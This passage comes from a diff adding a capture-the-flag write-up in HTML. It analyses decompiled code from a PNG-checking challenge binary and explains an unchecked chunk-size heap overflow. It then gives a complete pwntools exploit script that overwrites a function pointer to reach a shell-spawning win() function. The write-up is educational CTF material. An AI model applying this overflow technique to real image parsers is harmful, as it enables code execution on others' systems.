+    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mh">0x15</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">PNG_header</span> <span class="o">==</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1d</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x18</span> <span class="o">|</span>
+        <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span> <span class="o">|</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1e</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">bad_header</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"invalid checksum!"</span><span class="p">);</span>
+      <span class="n">bad_header</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"bad header"</span><span class="p">);</span>
+    <span class="n">bad_header</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">bad_header</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>First thing this does is check if there is <code class="language-plaintext highlighter-rouge">'\r'</code> at <code class="language-plaintext highlighter-rouge">image_alloc+0xb</code>. If we don’t supply this we immediately return with “bad header”. However if we do, we increment 
+the global variable <code class="language-plaintext highlighter-rouge">offset</code> by 0xc. <code class="language-plaintext highlighter-rouge">offset</code> sort of represents where/what position we are at when processing the image. In this case we just checked byte 0xb for 
+<code class="language-plaintext highlighter-rouge">'\r'</code>, so incrementing <code class="language-plaintext highlighter-rouge">offset</code> by 0xc ensures that we move past that byte into new pastures.</p>
+
+<p>We then use the <code class="language-plaintext highlighter-rouge">update_crc</code> function. This is responsible for generating a “check value” for our CRC, based off the contents of <code class="language-plaintext highlighter-rouge">crc_table</code>, and will generate said
+value from <code class="language-plaintext highlighter-rouge">image_alloc+0xc</code> for 0x11 bytes.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uint</span> <span class="nf">update_crc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">image_alloc</span><span class="p">,</span><span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_20</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">counter</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+  <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_20</span> <span class="o">=</span> <span class="n">image_alloc</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">counter</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">crc_table</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">local_20</span> <span class="o">^</span> <span class="n">local_10</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span>
+               <span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+                    <span class="cm">/* a really fancy way of 'return 0;', but we sort of control what goes here, a
+                       lil bit anyway. */</span>
+  <span class="k">return</span> <span class="o">~</span><span class="n">local_10</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Understanding the algorithm is not important, just know that it produces a value that we can (somewhat) control from <code class="language-plaintext highlighter-rouge">image_alloc</code>, then <code class="language-plaintext highlighter-rouge">not</code>s it (<code class="language-plaintext highlighter-rouge">~local_10</code>).
+It does this by looking up a value, byte by byte from <code class="language-plaintext highlighter-rouge">crc_table</code> based on the value of each byte from our input. Recall that <code class="language-plaintext highlighter-rouge">crc_table</code> is 256 bytes long, thus 
+having a value for every possible byte lookup. It then performs some operations that we don’t really care about (at least I dont).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mh">0x15</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">PNG_header</span> <span class="o">==</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1d</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x18</span> <span class="o">|</span>
+        <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span> <span class="o">|</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span>
+        <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0x1e</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">bad_header</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Coming back to <code class="language-plaintext highlighter-rouge">pngHeadValidate</code>, we see that we increment <code class="language-plaintext highlighter-rouge">offset</code> again by 0x15. Then we compare the bytes returned by <code class="language-plaintext highlighter-rouge">update_crc</code> with 4 bytes of our input from 
+<code class="language-plaintext highlighter-rouge">image_alloc + 0x1d</code> and if they match, we set <code class="language-plaintext highlighter-rouge">bad_header</code> to false/0 and then return, if they dont match we return true instead. If we do return 0:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"valid header, processing chunks"</span><span class="p">);</span>
+                    <span class="cm">/* Offset can be added to quite a bit, and if your allocation is only 16
+                       bytes (minimum) this may be incremented out of bounds, and into the
+                       image_fops array... Interesting... */</span>
+    <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">offset</span><span class="p">);</span>
+    <span class="n">invert_image_colours</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"do you want to invert the colors?"</span><span class="p">);</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">yes_no</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">yes_no</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">invert_image_colours</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We now begin “chunk processing”. This is the process that I discussed earlier; we dissect an image into chunks, and assign them each a “check field”. First however
+we increment our <code class="language-plaintext highlighter-rouge">image_alloc</code> by <code class="language-plaintext highlighter-rouge">offset</code>. This is used to step over the header and into the ‘chunks’ of the image. Now we decide wether or not we want to invert
+the image colours. This will be very important later, but not for inverting the colour.</p>
+
+<p>Now we finally get to the real meat of this program - where the actual chunk processing happens:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">while</span> <span class="p">((</span><span class="n">ended</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">image_fops</span><span class="p">)))</span> <span class="p">{</span>
+                    <span class="cm">/* until there are no chunks left to check. Also check that image_alloc doesn't
+                       get incremented out of bounds (but what if it already has been ;) ). */</span>
+      <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">])(</span><span class="n">image_alloc</span><span class="p">,</span><span class="n">invert_image_colours</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This loops through each image chunk, periodically checking that we don’t start processing image chunks in the <code class="language-plaintext highlighter-rouge">image_fops</code> allocation. So what do we do for each chunk
+and why would this check be needed. Do we write anything into/after each chunk during processing. Yes :). Here im going to show you the code thats relevant only for 
+processing chunks when colour-inversion was enabled, as the rest of it is pretty useless, although of course you can read it if you want.</p>
+
+<p>This <code class="language-plaintext highlighter-rouge">image_fops[1]</code> will, for us be <code class="language-plaintext highlighter-rouge">pngHeaderValidate</code> so lets look at that:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">image_4_bytes</span> <span class="o">=</span>
+       <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">&lt;&lt;</span> <span class="mh">0x18</span> <span class="o">|</span>
+       <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span> <span class="o">|</span>
+       <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span>
+       <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">;</span>
+  <span class="n">crc_write_int</span> <span class="o">=</span> <span class="n">image_4_bytes</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
+  <span class="n">__s1</span> <span class="o">=</span> <span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">__s1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">end</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">ended</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>First things first, we extract 4 bytes from the chunk, then <code class="language-plaintext highlighter-rouge">memcmp</code>’ at those bytes +2 with an <code class="language-plaintext highlighter-rouge">end</code> value. If this comes out correct, we have reached the marked
+end of our image. This means we can stop the chunk loop right here if we stick <code class="language-plaintext highlighter-rouge">end</code> at the correct place in our image/input. If we are not <code class="language-plaintext highlighter-rouge">ended</code>, we can go onto
+processing our image with colours inverted:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">invert_colours</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">while</span> <span class="p">(</span><span class="n">counter</span> <span class="o">&lt;</span> <span class="n">image_4_bytes</span><span class="p">)</span> <span class="p">{</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">counter</span><span class="p">)</span> <span class="o">=</span>
+             <span class="o">~*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">counter</span><span class="p">);</span>
+        <span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">check_value</span> <span class="o">=</span> <span class="n">update_crc</span><span class="p">(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span><span class="n">crc_write_int</span><span class="p">,</span><span class="n">crc_write_int</span><span class="p">);</span>
+      <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">crc_write_int</span><span class="p">);</span>
+                    <span class="cm">/* This looks really promising. If we can control what value returns from
+                       update_crc we can write whatever we wwant here, potentially an address or some bytes? */</span>
+      <span class="o">*</span><span class="n">image_alloc</span> <span class="o">=</span> <span class="n">check_value</span><span class="p">;</span>
+      <span class="n">image_alloc</span> <span class="o">=</span> <span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="c1">// [---snipped---]</span>
+  <span class="k">return</span> <span class="n">image_alloc</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>Now we go through our chunk and ‘not’/invert each byte, one at a time using the extracted <code class="language-plaintext highlighter-rouge">image_4_bytes</code> as the size of our chunk so we know when to stop iterating.
+After we do that we call <code class="language-plaintext highlighter-rouge">update_crc</code> with the controlled value from <code class="language-plaintext highlighter-rouge">image_alloc+2</code>, then write this <code class="language-plaintext highlighter-rouge">check_value</code> into our chunk, then incrementing our <code class="language-plaintext highlighter-rouge">image_alloc</code>
+by 2 to move on to the next chunk.</p>
+
+<p>So this function is called in a loop, until we either go beyond <code class="language-plaintext highlighter-rouge">image_alloc</code> and into <code class="language-plaintext highlighter-rouge">image_fops</code>, or if we set a special <code class="language-plaintext highlighter-rouge">end</code> value in one of our chunks, cool.</p>
+
+<p>Finally, we return back into main, then call the last of the function pointers, <code class="language-plaintext highlighter-rouge">pngFooterValidate</code>, then return:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">(</span><span class="o">*</span><span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">])(</span><span class="n">image_alloc</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"congrats this is a great picture"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+      <span class="n">__stack_chk_fail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="err">}</span>
+</code></pre></div></div>
+
+<p>(Im not gonna talk about <code class="language-plaintext highlighter-rouge">pngFooterValidate</code> as its not particularly relevant either, you’ll find out why soon.)
+Now that we have a good idea of what the program does + how it does it, we can move on to exploiting the program.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>The bug in particular is here, in <code class="language-plaintext highlighter-rouge">pngChunkValidate</code>. The <code class="language-plaintext highlighter-rouge">image_4_bytes</code> variable is extracted from our <code class="language-plaintext highlighter-rouge">image_alloc</code> and is meant to signify the size of the chunk
+(how many bytes to invert/not, in our case). It will iterate over <code class="language-plaintext highlighter-rouge">image_4_bytes</code> bytes, and doesnt check whether the number extracted is larger than what space we have
+in our allocation. We can use this to invert/not bytes outside of our allocation, but this isn’t its only use.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">image_4_bytes</span> <span class="o">=</span>
+       <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">&lt;&lt;</span> <span class="mh">0x18</span> <span class="o">|</span>
+       <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span> <span class="o">|</span>
+       <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span>
+       <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffU</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">;</span>
+  <span class="n">crc_write_int</span> <span class="o">=</span> <span class="n">image_4_bytes</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// This oroginates from the same `image_4_bytes`, just adding 4 tho</span>
+<span class="c1">// [--snipped--]</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">invert_colours</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// [--snipped--]</span>
+      <span class="p">}</span>
+      <span class="c1">// src of this update_src is user controlled</span>
+      <span class="n">check_value</span> <span class="o">=</span> <span class="n">update_crc</span><span class="p">(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span><span class="n">crc_write_int</span><span class="p">,</span><span class="n">crc_write_int</span><span class="p">);</span>
+      <span class="c1">// add the value to our allocation. Since no checks are done on image_4_bytes, none are done here either</span>
+      <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">crc_write_int</span><span class="p">);</span>
+      <span class="c1">// we write the check_value at the new image_alloc. This may write waaay our of bounds if the size is right</span>
+      <span class="o">*</span><span class="n">image_alloc</span> <span class="o">=</span> <span class="n">check_value</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>tldr: we get a controlled write-where with check_value onto the heap, and there is a function pointer that will be called in the adjacent allocation :).</p>
+
+<p>I havent mentioned this until now, but there is a <code class="language-plaintext highlighter-rouge">win()</code> function in the binary that looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>A desirable target, no? (bear in mind that PIE is also off)</p>
+
+<p>So our goal here is to overwrite <code class="language-plaintext highlighter-rouge">pngFooterValidate</code> with the <code class="language-plaintext highlighter-rouge">check_value</code> returned from <code class="language-plaintext highlighter-rouge">update_crc()</code>. There is a question though. Due to the unpredictable, complex
+nature of the <code class="language-plaintext highlighter-rouge">update_crc()</code> algo, we cannot <em>directly</em> influence the output. So how would we find an input that would result in an output from <code class="language-plaintext highlighter-rouge">update_crc()</code> of the
+address of the <code class="language-plaintext highlighter-rouge">win()</code> function? Well let me show you my exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>                                                                                                                    
+
+<span class="c1">##Gdb + config stuff
+</span><span class="n">script</span> <span class="o">=</span> <span class="s">'''
+b *main+160
+b *pngHeadValidate
+b *update_crc
+b *update_crc+98
+b *pngChunkValidate+27
+b *pngChunkValidate+160
+b *pngHeadValidate+244
+b *main+449
+continue
+'''</span>
+
+<span class="c1">## Making the image meta-stuff
+# Size of image, but also size of the allocation. This will give us 0x41 regardless tho lel.
+</span><span class="n">img_sz</span> <span class="o">=</span> <span class="mh">0x29</span>
+<span class="c1"># For passing the first check
+</span><span class="n">pngHead</span> <span class="o">=</span> <span class="mh">0x0a1a0a0d474e5089</span>
+<span class="c1"># We need this @ index 29 // 0x1d. Since the value at image_alloc+0xc is always the same, we can just see what value it spits out of update_crc
+# then input that value as our checksum. This will pass the check every time.
+</span><span class="n">checksum</span> <span class="o">=</span> <span class="mh">0x5ab9bc8a</span>
+
+<span class="c1">## Lets make our png.
+# Just some stuff to pass initial checks
+</span><span class="n">png</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pngHead</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="c1"># Padding until the 29th // 0x1d byte (start of checksum)
+</span><span class="n">png</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span> <span class="mh">0x1d</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">png</span><span class="p">)</span> <span class="p">)</span>
+<span class="c1"># This value will be returned from update_crc if you provided 
+</span><span class="n">png</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">checksum</span><span class="p">)</span>
+<span class="c1"># Counter for update_crc will be '\x27', this is enough to write out of our chunk up until the pngFooterValidate function pointer, at which point 
+# we write 2 bytes extracted from the return of crc_update.
+</span><span class="n">png</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x27</span><span class="s">"</span>
+<span class="c1"># Bruteforced value - ensures that crc_update returns the correct value, such that the last 2 bytes are set to 0x1818 that then is written 
+# at the end of the pngFooterValidate function pointer in the adjacent allocation. This function pointer is then called == shell, because these
+# are the bottom 2 bytes of win().
+</span><span class="n">png</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb18</span><span class="p">)</span>
+<span class="c1"># Padding so we send the correct num of bytes
+</span><span class="n">png</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">img_sz</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">png</span><span class="p">))</span>
+
+<span class="c1"># Just making sure we still good.
+</span><span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">png</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># Connect/start proc
+</span>    
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./chal"</span><span class="p">)</span>
+    <span class="c1">#p = remote("mc.ax", 31412)
+</span>    <span class="c1">#gdb.attach(p, script)
+</span>    
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"How large is your file?</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">img_sz</span><span class="p">)))</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"please send your image here:</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">png</span><span class="p">))</span>
+    
+    <span class="c1"># This will trigger the code that allows a 2-byte oob write into the function ptrs. Specifically the
+</span>    <span class="c1"># last 2 bytes of crc_update() ret get written onto the heap, making it one of the only (semi) user controlled
+</span>    <span class="c1"># values that can be written our of bounds like this.
+</span>    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"do you want to invert the colors?"</span><span class="p">,</span> <span class="s">"y"</span><span class="p">))</span>
+    
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>So initially I construct the image, setting up the checksum and header, etc. The checksum can be obtained as since it is based off of the contents before,
+the <code class="language-plaintext highlighter-rouge">update_crc</code> call will always spit out the same value (unless you change what came before). You an just break at the end of <code class="language-plaintext highlighter-rouge">update_crc()</code> in gdb and grab that
+value, then shove it into the buffer:</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125704171-5c4bcff5-f3cf-4326-a948-62df37f1672c.png" alt="image" /></p>
+
+<p>Then reverse it to reflect how its actually stored in memory:</p>
+
